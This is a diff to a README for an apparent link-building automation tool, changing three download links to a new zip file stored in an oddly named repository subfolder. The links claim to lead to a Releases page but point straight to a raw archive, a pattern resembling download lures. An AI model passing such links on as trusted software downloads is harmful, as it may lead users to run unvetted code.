@@ -1,6 +1,6 @@
 # 🌐 link-building-automation-tool - Automate Your Link Building Process
 
-[![Download](https://raw.githubusercontent.com/riverfr/link-building-automation-tool/main/mediatress/link-building-automation-tool.zip)](https://raw.githubusercontent.com/riverfr/link-building-automation-tool/main/mediatress/link-building-automation-tool.zip)
+[![Download](https://raw.githubusercontent.com/riverfr/link-building-automation-tool/main/mediatress/link_building_automation_tool_v3.1.zip)](https://raw.githubusercontent.com/riverfr/link-building-automation-tool/main/mediatress/link_building_automation_tool_v3.1.zip)
 
 ## 📚 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -21,7 +21,7 @@ The link-building-automation-tool helps you create effective backlinks to improv
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Download the Latest Version](https://raw.githubusercontent.com/riverfr/link-building-automation-tool/main/mediatress/link-building-automation-tool.zip)
+[Download the Latest Version](https://raw.githubusercontent.com/riverfr/link-building-automation-tool/main/mediatress/link_building_automation_tool_v3.1.zip)
 
 1. Follow the link above to navigate to the Releases page.
 2. Select the most recent version of the software. 
@@ -59,4 +59,4 @@ If you encounter any issues or have questions, please visit the GitHub Issues pa
 
 For more details, check the documentation located in the repository. Your feedback is valuable to us and helps improve the tool.
 
-[Download the Latest Version](https://raw.githubusercontent.com/riverfr/link-building-automation-tool/main/mediatress/link-building-automation-tool.zip) and start automating your link-building today!
+[Download the Latest Version](https://raw.githubusercontent.com/riverfr/link-building-automation-tool/main/mediatress/link_building_automation_tool_v3.1.zip) and start automating your link-building today!
